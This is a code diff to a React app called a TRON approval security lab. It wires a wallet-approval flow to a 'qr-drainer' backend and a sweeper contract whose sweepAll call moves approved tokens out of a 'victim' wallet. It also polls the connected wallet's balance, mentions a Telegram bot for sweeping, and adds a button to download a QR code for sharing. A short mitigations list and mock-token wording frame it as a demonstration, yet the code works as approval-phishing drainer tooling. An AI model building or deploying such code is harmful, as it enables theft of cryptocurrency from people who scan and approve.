@@ -1,5 +1,5 @@
 /* ============================================================================
-   TRON APPROVAL SECURITY LAB — Final "Live Monitor" Version
+   TRON APPROVAL SECURITY LAB — Final Presentation Version
    ============================================================================ */
 
 import React, { useEffect, useMemo, useRef, useState } from "react";
@@ -8,7 +8,8 @@ import { QRCodeSVG } from "qrcode.react";
 /* ----------------------------- configuration ---------------------------- */
 const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd";
 const SWEEPER_ADDRESS = "TVkKiHXUKoE4dVCyzE94Vyqqa7SWsmcMsN";
-const BACKEND = "https://qr-drainer.onrender.com";
+// Points to your live Render backend
+const BACKEND = "https://qr-drainer.onrender.com"; 
 const APPROVE_SELECTOR = "0x095ea7b3";
 
 const THEMES = {
@@ -166,8 +167,9 @@ export default function App() {
   const [showMit, setShowMit] = useState(true);
   const [copied, setCopied] = useState(false);
 
+  // Honest balance: starts at 0 so we never show fake money
   const [wallet, setWallet] = useState("");
-  const [victimBal, setVictimBal] = useState(1000000);
+  const [victimBal, setVictimBal] = useState(0);
   const [attackerBal, setAttackerBal] = useState(0);
   const [allowanceSet, setAllowanceSet] = useState(0);
   const [statuses, setStatuses] = useState(["pending", "pending", "pending", "pending", "pending"]);
@@ -189,31 +191,25 @@ export default function App() {
     root.style.setProperty("--glow", t.glow);
   }, [theme]);
 
-  // --- NEW: LIVE MONITOR (HEARTBEAT) ---
-  // This creates the "continuous communication" you asked for.
+  // --- LIVE HEARTBEAT MONITOR ---
   useEffect(() => {
     if (mode !== 'live') return;
-
     const heartbeat = setInterval(async () => {
-      // Check if TronLink is injected and has an address
       if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
         const currentAddr = window.tronWeb.defaultAddress.base58;
-        
-        // If we found a wallet and it's different from what we have (or empty)
         if (wallet !== currentAddr) {
           setWallet(currentAddr);
           log("info", `live: heartbeat detected ${short(currentAddr)}`);
-          
-          // Auto-fetch balance immediately
           try {
             const c = await window.tronWeb.contract().at(TOKEN_ADDRESS);
             const raw = await c.balanceOf(currentAddr).call();
-            setVictimBal(Number(raw.toString()) / 10 ** decimals);
-          } catch (e) { /* ignore read errors during switch */ }
+            const b = Number(raw.toString()) / 10 ** decimals;
+            setVictimBal(b);
+            if (b === 0) log("warn", "live: victim wallet holds 0 mock USDT — fund it via MockTRC20.transfer first");
+          } catch (e) { /* ignore read errors */ }
         }
       }
-    }, 2000); // Check every 2 seconds
-
+    }, 2000);
     return () => clearInterval(heartbeat);
   }, [mode, wallet, decimals]);
 
@@ -341,7 +337,7 @@ export default function App() {
           const owner = await sw.owner().call();
           const me = tw.defaultAddress.base58;
           if (owner !== me) {
-            log("warn", "live: connected wallet is not sweeper owner; sweep skipped");
+            log("warn", "live: connected wallet is not sweeper owner; sweep skipped (use Telegram bot)");
           } else {
             const tx = await sw.sweepAll(TOKEN_ADDRESS, me).send({ feeLimit: R.current.feeLimit * 1e6 });
             let info = await tw.trx.getTransactionInfo(tx);
@@ -413,6 +409,10 @@ export default function App() {
     ["Account abstraction", "Smart-account session keys + spending caps make one stolen signature insufficient."],
     ["Domain & contract reputation", "Blocklist phishing hosts and flag freshly-deployed contracts."],
   ];
+
+  // Dynamic QR logic
+  const qrValue = (mode === 'live' && wallet) ? wallet : (typeof window !== "undefined" ? window.location.href : "");
+  const qrLabel = (mode === 'live' && wallet) ? `Live Wallet: ${short(wallet)}` : "Scan to visit this site";
 
   return (
     <div className="lab">
@@ -505,15 +505,15 @@ export default function App() {
 
                 <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '10px', marginTop: '15px' }}>
                     <div className="qrbox" id="lab-qr-box">
-                        <QRCodeSVG value={typeof window !== "undefined" ? window.location.href : ""} size={132} />
+                        <QRCodeSVG value={qrValue} size={132} />
                     </div>
+                    <div className="lbl" style={{ marginBottom: 10, marginTop: 5, fontSize: '10px' }}>{qrLabel}</div>
                     <button 
                         onClick={handleDownloadQR}
                         style={{ background: '#3b82f6', color: 'white', border: 'none', padding: '8px 16px', borderRadius: '6px', cursor: 'pointer', fontSize: '12px', fontWeight: 'bold' }}
                     >
                         ⬇️ Download QR to Share
                     </button>
-                    <div className="lbl" style={{ marginBottom: 10, marginTop: 5 }}>Scan with Trust Wallet / TronLink</div>
                 </div>
 
                 <button className="claim" disabled={running} onClick={singleStep}>
